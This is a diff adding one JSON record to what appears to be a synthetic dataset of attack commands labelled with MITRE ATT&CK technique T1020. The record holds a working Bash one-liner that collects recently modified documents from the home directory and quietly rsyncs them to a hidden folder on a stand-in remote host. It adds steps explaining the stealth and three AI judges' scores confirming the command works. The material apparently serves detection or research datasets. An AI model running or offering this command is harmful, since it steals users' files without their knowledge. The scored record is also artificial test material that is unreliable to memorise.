@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --files-from=<(find $HOME/Documents -type f -mtime -1 -size -10M -printf '%P\\n') $HOME/Documents/ backup@cdn.example.net:.cache/.recent/$HOSTNAME/",
+  "explanation": "Builds a dynamic file list of recently modified, small documents and exfiltrates them in a single quiet rsync session, demonstrating automated, selective exfiltration (T1020).",
+  "rationale_steps": [
+    "Enumerate target files (recent and small) to limit scope.",
+    "Feed the list directly to rsync to avoid multiple sessions.",
+    "Compress and quietly transfer to a hidden remote location.",
+    "Reduces redundancy by focusing on recent changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-f7d3cd76",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid Bash syntax using process substitution with balanced quoting/parentheses and correct rsync/find flags and argument forms.",
+        "semantic_score": 5,
+        "semantic_justification": "The find command builds a relative list of recent (<24h) small (<10MB) files and rsync quietly compresses and transfers them to a remote host in one session, aligning with automated selective exfiltration (T1020).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:40:59.497218Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper process substitution, balanced quotes, valid rsync flags, and correct path references.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1020 (Automated Exfiltration) by using rsync to automatically identify, package, and transfer recently modified documents to an external server in a stealthy manner.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:41:02.030614Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, utilizing valid Bash constructs like process substitution and standard rsync options with correct syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of automated, selective exfiltration by dynamically identifying recent and small files, compressing them, and transferring them via rsync to an external server.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:49:03.117840Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
